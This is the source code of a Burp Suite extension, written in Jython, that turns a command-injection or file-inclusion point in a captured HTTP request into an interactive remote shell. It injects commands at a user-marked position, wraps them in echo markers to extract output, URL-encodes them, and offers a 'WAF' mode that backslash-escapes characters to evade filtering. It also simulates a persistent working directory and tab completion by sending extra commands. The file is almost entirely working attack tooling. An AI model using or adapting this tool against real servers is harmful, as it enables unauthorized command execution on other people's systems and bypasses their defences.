import re
from burp import IBurpExtender
from burp import IContextMenuFactory
from burp import IMessageEditorController
from burp import ITab
from java.awt import BorderLayout
from java.awt import Color
from java.awt import GridLayout
from java.awt import KeyboardFocusManager
from java.awt.event import ActionListener
from java.awt.event import ItemEvent
from java.awt.event import ItemListener
from java.awt.event import KeyListener
from java.io import PrintWriter
from java.lang import Runnable
from java.lang import Thread
from java.util import Collections
from javax.swing.border import EmptyBorder
from javax.swing import BorderFactory
from javax.swing import BoxLayout
from javax.swing import JButton
from javax.swing import JCheckBox
from javax.swing import JLabel
from javax.swing import JMenuItem
from javax.swing import JPanel
from javax.swing import JScrollPane
from javax.swing import JTabbedPane
from javax.swing import JTextArea
from javax.swing import JTextField
COLOR_BURP_ORANGE = Color(0xFF, 0xC5, 0x99)
COLOR_BURP_TITLE_ORANGE = Color(0xFF, 0x66, 0x33)

class BurpExtender(IBurpExtender, ITab):
    #
    # implement IBurpExtender
    #

    def registerExtenderCallbacks(self, callbacks):
        # set our extension name
        callbacks.setExtensionName("Shell - FWD/LFI")

        #Keep references to:
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        # obtain our output stream
        self._stdout = PrintWriter(callbacks.getStdout(), True)

        #get ShellController instance
        self._shellController = ShellController(self)

        #Give ourself a class to pass important hooks around
        Utils().setParent(self)

        #Register main component
        callbacks.customizeUiComponent(self._shellController.getMainComponent())

        # register SendTo option
        callbacks.registerContextMenuFactory(OfferShell())

        # add the custom tab to Burp's UI
        callbacks.addSuiteTab(self)

        # add common used GUI interfaces to our utils
        Utils().registerComponents()

        return

    def getTabCaption(self):
        return "Shell - FWD/LFI"

    def getUiComponent(self):
        return self._shellController.getMainComponent()

class ShellController:
    def __init__(self, parent):
        self._sessions = {}
        self._currentSessionId = None
        self._requests = {}
        self._currentRequestId = None
        self._consoleController = self.ConsoleController(self)
        self._positionsController = self.PositionsController(self)
        self._configurationController = self.ConfigurationController(self)
        self._outputIsolator = ["3535start3535", "3535end3535"]
        self._virtualPersistence = True
        self._tabCompletion = True
        self._urlEncode = True
        self._outputCompleteResponse = False
        self._waf = False

    def getMainComponent(self):
        # tabsOriginal with request/response viewers
        self._tabsMain = JTabbedPane()
        # Add to the main tabs
        self._tabsMain.addTab("Sessions", self._consoleController.getMainComponent())
        self._tabsMain.addTab("Positions", self._positionsController.getMainComponent())
        self._tabsMain.addTab("Configuration", self._configurationController.getMainComponent())
        return self._tabsMain

    def addRequest(self, iHttpRequestResponse):
        #TODO Note sure yet if I want to store more than one request... It's just used to start a session
        requestId = Utils.urlFrom(iHttpRequestResponse)
        requestHttpService = Utils.httpServiceFrom(iHttpRequestResponse)
        request = Utils.requestFrom(iHttpRequestResponse)
        self._currentRequestId = requestId
        self._requests[requestId] = {'data': request, 'httpService': requestHttpService,
                                     'positionStart': None, 'positionEnd': None}

        # TODO I'll need to delegate this a combobox or table, but for now, I'll select the first one
        self._positionsController.setEditor(request)

    def sessionIds(self):
        return self._sessions.keys()

    def sessions(self):
        return self._sessions

    def requestIds(self):
        return self._requests.keys()

    def request(self, requestId):
        return self.requests()[requestId]

    def requests(self):
        return self._requests

    def currentRequest(self):
        return self._requests[self._currentRequestId]

    def currentRequestRaw(self):
        """Return the raw (bytes) of the request"""
        return self._requests[self._currentRequestId]['data']

    def setCurrentRequestBounds(self, positionStart, positionEnd):
        self._requests[self._currentRequestId]['positionStart'] = positionStart
        self._requests[self._currentRequestId]['positionEnd'] = positionEnd

    def currentRequestId(self):
        return self._currentRequestId

    def setCurrentRequestId(self, requestId):
        self._currentRequestId = requestId

    def getRequestWithCommand(self, requestId, cmd):
        Utils.out("getRequestWithCommand > self._outputIsolator")
        Utils.out(self._outputIsolator)
        if self._outputIsolator:
            Utils.out("getRequestWithCommand > outputIsolator wanted > cmd before")
            Utils.out(cmd)
            cmd = "echo " + Utils.outputIsolator[0] + "; " + cmd + "; echo " + Utils.outputIsolator[1]
            Utils.out("getRequestWithCommand > outputIsolator wanted > final command:")
            Utils.out(cmd)
        if self._urlEncode:
            Utils.out("getRequestWithCommand > urlEncode wanted")
            cmd = Utils.urlEncode(cmd)
        Utils.out("getRequestWithCommand > self._waf")
        Utils.out(self._waf)
        if self._waf:
            Utils.out("getRequestWithCommand > waf wanted > cmd before waf")
            Utils.out(cmd)
            cmd_waf = ''
            for character in cmd:
                if len(re.findall("\S", character)) > 0:
                    cmd_waf = cmd_waf + '\\' + character
                else:
                    cmd_waf = cmd_waf + character
            cmd = cmd_waf
            Utils.out("getRequestWithCommand > waf wanted > final command:")
            Utils.out(cmd)
        Utils.out("ShellController > getRequestWithCommand")
        original_request = self.requests()[requestId]
        original_request_data = original_request['data']
        Utils.out("Utils.bytesToString(original_request_data)")
        Utils.out(Utils.bytesToString(original_request_data))
        modified_request = Utils.changeRawData(original_request_data, original_request['positionStart'], original_request['positionEnd'], cmd)
        Utils.out("Utils.bytesToString(modified_request)")
        Utils.out(Utils.bytesToString(modified_request))
        return modified_request

    def getRequestHttpService(self, requestId):
        return self.request(requestId)['httpService']

    class ConsoleController:
        def __init__(self, parent):
            self._parent = parent
            self._sessions = self._parent.sessions()
            self._request = None #TODO I'll need a request in order to connect to something
            self._position = None #TODO I'll need a position, something to change in the header to insert the command
            self._pwd = None
            self._commandHistory = []
            self._historyIndex = 0
            self._tabComplete = []

        def getMainComponent(self):
            self._mainPanel = JPanel(BorderLayout())
            # input
            self._consolePwd = JTextField()
            self._consolePwd.setEditable(False)
            self._consolePwd.setText("Not initialized")
            self._consoleInput = JTextField()
            #Remove 'tab' low-level tab-function of jumping to other component, so I can use it
            self._consoleInput.setFocusTraversalKeys(KeyboardFocusManager.FORWARD_TRAVERSAL_KEYS, Collections.EMPTY_SET)
            self._consoleInput.addActionListener(self.EnterPress())
            self._consoleInput.addKeyListener(self.KeyPress())
            self._inputPanel = JPanel(BorderLayout())
            self._inputPanel.add(self._consolePwd, BorderLayout.WEST)
            self._inputPanel.add(self._consoleInput, BorderLayout.CENTER)
            # output
            self._consoleOutput = JTextArea()
            self._consoleOutput.setEditable(False)
            self._consoleOutput.setForeground(Color.WHITE)
            self._consoleOutput.setBackground(Color.BLACK)
            self._consoleOutput.setFont(self._consoleOutput.getFont().deriveFont(12.0))

            self._scrollPaneConsoleOutput = JScrollPane(self._consoleOutput)

            # Add to main panel and return the main panel
            self._mainPanel.add(self._scrollPaneConsoleOutput, BorderLayout.CENTER)
            self._mainPanel.add(self._inputPanel, BorderLayout.SOUTH)
            return self._mainPanel

        def sendCommand(self, requestId, cmd, directTo):
            Utils.out("ConsoleController > sendCommand > 'cmd'")
            Utils.out(cmd)
            cmdModified = cmd
            requestHttpMethod = self._parent.getRequestHttpService(requestId)
            #If I use virtual persistence and there's already a pwd set
            if Utils.shellController._virtualPersistence and self.pwd():
                #Then always prepend 'cd <pwd>' to any command executed. In reality we
                # always enter in the same directory, but because this shell keeps track
                # of where the user thinks he is, and always goes to that directory first
                # the illusion of a persistence is created
                cmdVirtual = "cd " + self.pwd()
                cmdModified = cmdVirtual + "; " + cmd
            requestWithCommand = self._parent.getRequestWithCommand(requestId, cmdModified)
            Thread(GetThreadForRequest(requestHttpMethod, requestWithCommand, directTo)).start()
            self._commandHistory.append(cmd)
            self.resetHistoryIndex()
            self.clearCmd()

            if Utils.shellController._virtualPersistence:
                if cmd.startswith('cd '):
                    Utils.out("ConsoleController > sendCommand: detected 'cd '")
                    #ask for pwd
                    cmdPwd = cmdModified + "; " + Commands.pwd(Commands.OS_LINUX)
                    requestWithCommand = self._parent.getRequestWithCommand(requestId, cmdPwd)
                    Thread(GetThreadForRequest(requestHttpMethod, requestWithCommand, 'pwd')).start()
                if Utils.shellController._tabCompletion:
                    #ask 'ls -1a' for tab-completion
                    # The first command, pwd is set here, but cmdVirtual ain't. But this
                    # also means we are at the entry directory anyway, so we can just ask ls
                    # and get the correct tab completion anyway
                    try:
                        cmdTabComplete = cmdVirtual + "; " + Commands.ls(Commands.OS_LINUX)
                    except:
                        cmdTabComplete = Commands.ls(Commands.OS_LINUX)
                    requestWithCommand = self._parent.getRequestWithCommand(requestId, cmdTabComplete)
                    Thread(GetThreadForRequest(requestHttpMethod, requestWithCommand, 'tabComplete')).start()
            else:
                if Utils.shellController._tabCompletion:
                    cmdTabComplete = Commands.ls(Commands.OS_LINUX)
                    requestWithCommand = self._parent.getRequestWithCommand(requestId, cmdTabComplete)
                    Thread(GetThreadForRequest(requestHttpMethod, requestWithCommand, 'tabComplete')).start()

            #either way execute the requested command

        def startSession(self):
            #TODO when starting a session I want to test for a number of things:
            # if I can reform the request to a post request and still have it work
            # if base 64 is available
            # if bash is available
            if Utils.shellController._virtualPersistence and Utils.shellController._outputIsolator:
                Utils.out("startSession > virtualPersistence enabled > Requesting pwd")
                self.sendCommand(self._parent.currentRequestId(), Commands.pwd(Commands.OS_LINUX), 'pwd')

        def appendOutput(self, text, printCommand=True):
            try:
                if printCommand:
                    self.printCommand(self._commandHistory[-1])
            except:
                pass
            self._consoleOutput.append("\n" + text)
            #auto scroll down if needed
            self._consoleOutput.setCaretPosition(self._consoleOutput.getDocument().getLength())

        def printCommand(self, cmd):
            self._consoleOutput.append("\n" + self._pwd + "# " + cmd)

        def printCurrentCommand(self):
            self.printCommand(self.cmd())

        def setPwd(self, pwd):
            self._pwd = pwd
            self._consolePwd.setText(pwd)

        def pwd(self):
            return self._pwd

        def cmdHistoryCount(self):
            return len(self._commandHistory) #TODO - 1

        def setCmd(self, cmd):
            self._consoleInput.setText(cmd)

        def cmd (self):
            return self._consoleInput.getText()

        def clearCmd(self):
            self._consoleInput.setText('')

        def resetHistoryIndex(self):
            self._historyIndex = self.cmdHistoryCount()

        def previousCommand(self):
            if self._historyIndex > 0:
                self._historyIndex -= 1
                self.setCmd(self._commandHistory[self._historyIndex])

        def nextCommand(self):
            if self._historyIndex < self.cmdHistoryCount():
                self._historyIndex += 1
                self.setCmd(self._commandHistory[self._historyIndex])
            else:
                self.clearCmd()
                self.resetHistoryIndex()

        def setTabComplete(self, text):
            self._tabComplete = text.splitlines()

        def findTabComplete(self, beginCharacters=''):
            suggestions = []
            if beginCharacters:
                for suggestion in self._tabComplete:
                    Utils.debug("suggestion", suggestion)
                    Utils.debug("text", beginCharacters)
                    if suggestion[0:len(beginCharacters)] == beginCharacters:
                        suggestions.append(suggestion)
            else:
                suggestions = self._tabComplete
            return suggestions

        def tabComplete(self):
            currentCommand = self.cmd()
            Utils.debug("currentCommand", currentCommand)
            if currentCommand:
                commandArray = currentCommand.split(' ')
                lastword = commandArray.pop()
                Utils.debug("lastword", lastword)
                suggestions = self.findTabComplete(lastword)
                if suggestions:
                    if len(suggestions) > 1:
                        self.printCurrentCommand()
                        for suggestion in suggestions:
                            self.appendOutput(suggestion, False)
                    if len(suggestions) == 1:
                        self.setCmd(' '.join(commandArray) + ' ' + suggestions.pop())
            else:
                suggestions = self.findTabComplete()
                if len(suggestions) > 1:
                    self.printCurrentCommand()
                    for suggestion in suggestions:
                        self.appendOutput(suggestion, False)

        class EnterPress(ActionListener): #TODO remove: AbstractAction
            def actionPerformed(self, e):
                Utils.consoleController.sendCommand(Utils.shellController.currentRequestId(), Utils.consoleInput.getText(), 'console')

            def keyPressed(self, e):
                Utils.out("key pressed")

        class KeyPress(KeyListener):
            def keyTyped(self, e):
                pass

            def keyReleased(self, e):
                if e.getKeyCode() == e.VK_DOWN:
                    Utils.consoleController.nextCommand()
                    Utils.out("released down")
                if e.getKeyCode() == e.VK_UP:
                    Utils.consoleController.previousCommand()
                    Utils.out("released up")

                if e.getKeyCode() == e.VK_TAB:
                    Utils.out("pressed tab")
                    Utils.consoleController.tabComplete()

            def keyPressed(self, e):
                pass

    class PositionsController(IMessageEditorController):
        def __init__(self, parent):
            self._parent = parent

        def getMainComponent(self):
            self._mainPanel = JPanel(BorderLayout())
            #Left panel
            self._leftPanel = JPanel(BorderLayout())
            self._leftPanel.setBorder(EmptyBorder(10, 10, 10, 10))
            #Left subpanel - Positions editor
            self._positionsEditor = Utils.callbacks.createTextEditor()
            #TODO Remove a normal editor?  self._positionsEditor = Utils.callbacks.createMessageEditor(self, True)
            self._positionsEditor.getComponent().setBorder(BorderFactory.createLineBorder(Color.BLACK))
            #Left subpanel - Title pane
            self._leftTitlePanel = JPanel(GridLayout(0, 1))
            self._leftTitlePanel.setBorder(EmptyBorder(0, 10, 10, 10))
            self._titleText = JLabel("Commands Position")
            self._titleText.setForeground(COLOR_BURP_TITLE_ORANGE)
            self._titleText.setFont(self._titleText.getFont().deriveFont(16.0))
            self._titleSubtitleText = JTextArea("Configure the position where commands will be inserted into the base request. Select the requests that were send Shell in the dropdown, then select the part of the request where commands need to be inserted and click the 'Add $' button.")
            self._titleSubtitleText.setEditable(False)
            self._titleSubtitleText.setLineWrap(True)
            self._titleSubtitleText.setWrapStyleWord(True)
            self._titleSubtitleText.setHighlighter(None)
            self._titleSubtitleText.setBorder(None)
            self._leftTitlePanel.add(self._titleText)
            self._leftTitlePanel.add(self._titleSubtitleText)
            #Left subpanel - Add positions editor and title
            self._leftPanel.add(self._leftTitlePanel, BorderLayout.NORTH)
            self._leftPanel.add(self._positionsEditor.getComponent(), BorderLayout.CENTER)
            #Right panel
            #self._rightPanel = JPanel(GridLayout(20, 1))
            self._rightPanel = JPanel()
            self._rightPanel.setLayout(BoxLayout(self._rightPanel, BoxLayout.Y_AXIS))
            #self._rightPanel.setPreferredSize(Dimension(150, 30))
            self._rightPanel.setBorder(EmptyBorder(10, 10, 10, 10))
            #Right panel - buttons
            self._buttonAdd = JButton("        Add $        ", actionPerformed=self.buttonAddClick)
            self._buttonClear = JButton("       Clear $       ") #, actionPerformed=None
            # Right panel - add components
            self._rightPanel.add(self._buttonAdd)
            self._rightPanel.add(self._buttonClear)

            self._mainPanel.add(self._rightPanel, BorderLayout.EAST)
            self._mainPanel.add(self._leftPanel, BorderLayout.CENTER)

            return self._mainPanel

        def buttonAddClick(self, e):
            Utils.out("Button click")
            if self._positionsEditor.getSelectedText():
                #TODO: For if it's a messageeditor in stead of texteditor Utils.out(self._positionsEditor.getSelectedData())
                self.addPosition(self._positionsEditor.getSelectionBounds())
                self._parent._consoleController.startSession()

        def setEditor(self, request_in_bytes):
            self._positionsEditor.setText(request_in_bytes)
            #TODO: for if I make the positions a messageExitor: self._positionsEditor.setMessage(iHttpRequestResponse.getRequest(), True)

        def addPosition(self, boundsArray):
            if len(boundsArray) == 2:
                self._parent.setCurrentRequestBounds(boundsArray[0], boundsArray[1])
                modified_request = Utils.wrapRawData(self._parent.currentRequestRaw(), boundsArray[0], boundsArray[1], "$", "$")
                self.setEditor(modified_request)

    class ConfigurationController(IMessageEditorController):
        def __init__(self, parent):
            self._parent = parent

        def getMainComponent(self):
            self._mainPanel = JPanel()
            self._mainPanel.setLayout(BoxLayout(self._mainPanel, BoxLayout.Y_AXIS))
            self._outputIsolatorSwitch = JCheckBox("Use output isolator")
            self._outputIsolatorSwitch.setSelected(True)
            self._outputIsolatorSwitch.addItemListener(self.OutputIsolatorSwitchListener())
            self._mainPanel.add(self._outputIsolatorSwitch)
            self._tabCompletionSwitch = JCheckBox("Use tab-completion")
            self._tabCompletionSwitch.setSelected(True)
            self._tabCompletionSwitch.addItemListener(self.TabCompletionSwitchListener())
            self._mainPanel.add(self._tabCompletionSwitch)
            self._virtualPersistenceSwitch = JCheckBox("Use virtual persistence")
            self._virtualPersistenceSwitch.setSelected(True)
            self._virtualPersistenceSwitch.addItemListener(self.VirtualPersistenceSwitchListener())
            self._mainPanel.add(self._virtualPersistenceSwitch)
            self._urlEncodeSwitch = JCheckBox("Use url encode")
            self._urlEncodeSwitch.setSelected(True)
            self._urlEncodeSwitch.addItemListener(self.UrlEncodeSwitchListener())
            self._mainPanel.add(self._urlEncodeSwitch)
            self._outputCompleteResponseSwitch = JCheckBox("Use full response (not only the response body)")
            self._outputCompleteResponseSwitch.setSelected(False)
            self._outputCompleteResponseSwitch.addItemListener(self.OutputCompleteResponseSwitchListener())
            self._mainPanel.add(self._outputCompleteResponseSwitch)
            self._wafSwitch = JCheckBox("WAF: Prepend each non-whitespace character (regex '\\w') with '\\'")
            self._wafSwitch.setSelected(False)
            self._wafSwitch.addItemListener(self.WafSwitch())
            self._mainPanel.add(self._wafSwitch)
            return self._mainPanel

        class OutputIsolatorSwitchListener(ItemListener):
            def itemStateChanged(self, e):
                if e.getStateChange() == ItemEvent.SELECTED:
                    Utils.out("selected")
                    isolator = ["3535start3535", "3535end3535"]
                    Utils.shellController._outputIsolator = isolator
                    Utils.outputIsolator = isolator
                    Utils._outputIsolator = isolator
                elif e.getStateChange() == ItemEvent.DESELECTED:
                    #TODO If deselected, Virtual persistence should be disabled: unless the body only returns
                    # the command and nothing else, it's near impossible to warrant virtual persistence.
                    # One possibility I have, is to also allow to define positions in the response tab and filter
                    # out the command response like that (without using the outputisolators)
                    Utils.out("deselected")
                    Utils.shellController._outputIsolator = None
                    Utils.outputIsolator = None
                    Utils._outputIsolator = None


        class TabCompletionSwitchListener(ItemListener):
            def itemStateChanged(self, e):
                if e.getStateChange() == ItemEvent.SELECTED:
                    Utils.shellController._tabCompletion = True
                elif e.getStateChange() == ItemEvent.DESELECTED:
                    Utils.shellController._tabCompletion = False

        class VirtualPersistenceSwitchListener(ItemListener):
            def itemStateChanged(self, e):
                if e.getStateChange() == ItemEvent.SELECTED:
                    Utils.shellController._virtualPersistence = True
                elif e.getStateChange() == ItemEvent.DESELECTED:
                    Utils.shellController._virtualPersistence = False

        class UrlEncodeSwitchListener(ItemListener):
            def itemStateChanged(self, e):
                if e.getStateChange() == ItemEvent.SELECTED:
                    Utils.shellController._urlEncode = True
                elif e.getStateChange() == ItemEvent.DESELECTED:
                    Utils.shellController._urlEncode = False

        class OutputCompleteResponseSwitchListener(ItemListener):
            def itemStateChanged(self, e):
                if e.getStateChange() == ItemEvent.SELECTED:
                    Utils.shellController._outputCompleteResponse = True
                elif e.getStateChange() == ItemEvent.DESELECTED:
                    Utils.shellController._outputCompleteResponse = False

        class WafSwitch(ItemListener):
            def itemStateChanged(self, e):
                if e.getStateChange() == ItemEvent.SELECTED:
                    Utils.shellController._waf = True
                elif e.getStateChange() == ItemEvent.DESELECTED:
                    Utils.shellController._waf = False

class GetThreadForRequest(Runnable):
    def __init__(self, requestHttpMethod, requestWithCommand, directTo):
        self._requestHttpMethod = requestHttpMethod
        self._requestWithCommand = requestWithCommand
        self._directTo = directTo

    def run(self):
        iHttpRequestResponse = Utils.callbacks.makeHttpRequest(self._requestHttpMethod, self._requestWithCommand)
        Utils.out("GetThreadForRequest > iHttpRequestResponse")
        Utils.out(iHttpRequestResponse)
        if Utils.shellController._outputCompleteResponse:
            output = Utils.bytesToString(Utils.responseFrom(iHttpRequestResponse))
        else:
            output = Utils.responseBodyFrom(iHttpRequestResponse)

        Utils.out(output)
        Utils.out("done")
        Utils.out("Complete response:")
        Utils.out(Utils.bytesToString(Utils.responseFrom(iHttpRequestResponse)))

        if Utils.outputIsolator:
            Utils.out("Body:")
            Utils.out(Utils.responseBodyFrom(iHttpRequestResponse))
            Utils.out("outputIsolator detected...")
            output = Utils.searchBetweenAndExtract(output, Utils.outputIsolator[0], Utils.outputIsolator[1])
            Utils.out("Body after outputIsolator strip:")
            Utils.out(output)
        if isinstance(self._directTo, list):
            for output in self._directTo:
                self.sendTo(output, output)
        if isinstance(self._directTo, basestring):
            self.sendTo(self._directTo, output)

    def sendTo(self, output, text):
        if output == 'pwd':
            Utils.setPwd(text)
        if output == 'tabComplete':
            Utils.setTabComplete(text)
        if output == 'console':
            Utils.appendOutput(text)

class Utils:
    @classmethod
    def setParent(cls, parent):
        cls._parent = parent
        cls.parent = cls._parent
        cls._helpers = parent._helpers
        cls.helpers = cls._helpers
        cls._callbacks = cls._parent._callbacks
        cls.callbacks = cls._callbacks
        cls._stdout = PrintWriter(cls._callbacks.getStdout(), True)
        cls._stderr = PrintWriter(cls._callbacks.getStderr(), True)
        cls._shellController = cls._parent._shellController
        cls.shellController = cls._shellController
        cls._outputIsolator = cls._shellController._outputIsolator
        cls.outputIsolator = cls._outputIsolator
        cls._consoleController = cls._shellController._consoleController
        cls.consoleController = cls._consoleController

    @classmethod
    def registerComponents(cls):
        cls._consoleInput = cls._consoleController._consoleInput
        cls.consoleInput = cls._consoleInput
        cls._consoleOutput = cls._consoleController._consoleOutput
        cls.consoleOutput = cls._consoleOutput

    @classmethod
    def setPwd(cls, text):
        """In the console, set the 'pwd' field to this text"""
        cls.consoleController.setPwd(text)

    @classmethod
    def pwd(cls):
        """In the console, set the 'pwd' field to this text"""
        return cls.consoleController.pwd()

    @classmethod
    def setConsole(cls, text):
        """In the console, set the 'output' pane to this text"""
        cls._consoleOutput.setText(text)

    @classmethod
    def setTabComplete(cls, text):
        """In the console, set the 'output' pane to this text"""
        cls.consoleController.setTabComplete(text)

    @classmethod
    def appendOutput(cls, text):
        """In the console, append this text to the 'output' pane"""
        cls.consoleController.appendOutput(text)

    """Everything specific to this program above this separator"""
    """Everything general below this"""

    @classmethod
    def out(cls, message):
        cls._stdout.println(message)

    @classmethod
    def debug(cls, title, variable):
        cls.out(title)
        cls.out("value:")
        cls.out(variable)
        cls.out(type(variable))
        cls.out("methods:")
        cls.out(dir(variable))

    @classmethod
    def err(cls, message):
        cls._stderr.println(message)

    @classmethod
    def bytesToString(cls, bytes):
        return cls._helpers.bytesToString(bytes)

    @classmethod
    def stringToBytes(cls, string):
        return cls._helpers.stringToBytes(string)

    @classmethod
    def urlEncode(cls, text):
        return cls._helpers.urlEncode(text)

    @classmethod
    def urlDecode(cls, data):
        return cls._helpers.urlDecode(data)

    @classmethod
    def urlFrom(cls, iHttpRequestResponse):
        return cls._helpers.analyzeRequest(iHttpRequestResponse).getUrl()

    @classmethod
    def methodFrom(cls, iHttpRequestResponse):
        return cls._helpers.analyzeRequest(iHttpRequestResponse).getMethod()

    @classmethod
    def requestBodyFrom(cls, iHttpRequestResponse):
        body_offset = cls._helpers.analyzeRequest(iHttpRequestResponse).getBodyOffset()
        return cls._helpers.bytesToString(iHttpRequestResponse.getRequest()[body_offset:])

    @classmethod
    def requestBodyRawFrom(cls, iHttpRequestResponse):
        body_offset = cls._helpers.analyzeRequest(iHttpRequestResponse).getBodyOffset()
        return iHttpRequestResponse.getRequest()[body_offset:]

    @classmethod
    def responseBodyFrom(cls, iHttpRequestResponse):
        body_offset = cls._helpers.analyzeResponse(iHttpRequestResponse.getResponse()).getBodyOffset()
        return cls._helpers.bytesToString(iHttpRequestResponse.getResponse()[body_offset:])

    @classmethod
    def responseBodyRawFrom(cls, iHttpRequestResponse):
        body_offset = cls._helpers.analyzeResponse(iHttpRequestResponse.getResponse()).getBodyOffset()
        return iHttpRequestResponse.getResponse()[body_offset:]

    @classmethod
    def httpServiceFrom(cls, iHttpRequestResponse):
        return iHttpRequestResponse.getHttpService()

    @classmethod
    def requestFrom(cls, iHttpRequestResponse):
        return iHttpRequestResponse.getRequest()

    @classmethod
    def responseFrom(cls, iHttpRequestResponse):
        return iHttpRequestResponse.getResponse()

    @classmethod
    def changeRawData(cls, rawData, start, end, newContent):
        """In raw bytes: replace everything that's between the 'start' and 'end' position
        with the new content"""
        modified_raw_data = rawData[0:start]
        modified_raw_data = modified_raw_data + Utils.stringToBytes(newContent)
        modified_raw_data = modified_raw_data + rawData[end:]
        return modified_raw_data

    @classmethod
    def wrapRawData(cls, rawData, start, end, beforeContent, afterContent):
        """In raw bytes: the content between the 'start' and 'end' markers: content is
         inserted before and after it. The rest of the message stays in tact"""
        modified_raw_data = rawData[0:start]
        modified_raw_data = modified_raw_data + Utils.stringToBytes(beforeContent)
        modified_raw_data = modified_raw_data + rawData[start:end]
        modified_raw_data = modified_raw_data + Utils.stringToBytes(afterContent)
        modified_raw_data = modified_raw_data + rawData[end:]
        return modified_raw_data

    @classmethod
    def searchBetweenAndExtract(cls, data, startDelimiter, endDelimiter):
        """In raw bytes: search for the position of the start- and end delimiter
        and extract everything that's between that"""
        #if input is string (basestring = types 'str' and 'unicode')
        if isinstance(data, basestring):
            startOffset = data.find(startDelimiter)
            endOffset = data.find(endDelimiter)
            if startOffset == -1 or endOffset == -1:
                Utils.err("Utils > searchBetweenAndExtract - Something went wrong: I expected to find " + startDelimiter + " and " + endDelimiter + ". But at least one of them was missing")
            else:
                startOffset = startOffset + len(startDelimiter)
                return data[startOffset:endOffset].strip()

##
## Creates the sendto tab in other areas of Burp
class OfferShell(IContextMenuFactory):
    def createMenuItems(self, invocation):
        options = []
        if invocation != None and invocation.selectedMessages[0] != None:
            menuItem = JMenuItem("Send to Shell - FWD/LFI")
            menuItem.addActionListener(self.addRequest(invocation))
            options.append(menuItem)
        return options

    def addRequest(self, invocation):
        for iHttpRequestResponse in invocation.getSelectedMessages():
            Utils.shellController.addRequest(iHttpRequestResponse)

            #self.highlightTab()

class Commands:
    OS_LINUX = 'Linux'

    @classmethod
    def pwd(cls, os):
        """@Return: The command that prints the current directory"""
        if os == Commands.OS_LINUX:
            return 'pwd'

    @classmethod
    def ls(cls, os):
        """@Return: The command that lists all directories and files (including hidden) in one continuous list (without any extra information)"""
        if os == Commands.OS_LINUX:
            return 'ls -1a'